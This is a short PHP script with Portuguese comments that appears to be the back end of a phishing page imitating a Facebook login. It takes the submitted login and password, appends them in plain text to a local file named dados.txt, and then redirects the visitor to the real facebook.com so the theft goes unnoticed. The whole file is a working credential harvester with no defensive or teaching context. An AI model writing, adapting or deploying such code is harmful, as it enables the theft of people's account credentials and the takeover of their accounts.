<?php

$login = $_POST['login'];
$senha = $_POST['senha'];

$linha = "$login | $senha" . PHP_EOL;

file_put_contents("_/dados.txt", $linha, FILE_APPEND);

// redireciona para site externo
header("Location: https://www.facebook.com");
exit();

?>